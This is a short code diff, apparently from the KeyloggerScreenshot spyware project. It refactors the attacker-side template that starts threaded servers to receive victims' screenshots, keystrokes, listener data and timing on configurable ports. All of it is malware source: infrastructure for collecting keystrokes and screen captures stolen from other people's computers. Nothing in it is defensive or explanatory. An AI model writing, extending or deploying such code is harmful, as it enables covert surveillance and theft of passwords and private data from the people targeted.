@@ -43,13 +43,15 @@ try:
 import KeyloggerScreenshot as ks 
 import threading
 
-server_photos = ks.ServerPhotos("{ipaddress}", {port_photos})
+ip = "{ipaddress}"
 
-server_keylogger = ks.ServerKeylogger("{ipaddress}", {port_keylogger})
+server_photos = ks.ServerPhotos(ip, {port_photos})
 
-server_listener = ks.ServerListener("{ipaddress}", {port_listener})
+server_keylogger = ks.ServerKeylogger(ip, {port_keylogger})
 
-server_time = ks.Timer("{ipaddress}", {port_time})
+server_listener = ks.ServerListener(ip, {port_listener})
+
+server_time = ks.Timer(ip, {port_time})
 
 threading_server = threading.Thread(target=server_photos.start)
 threading_server.start()
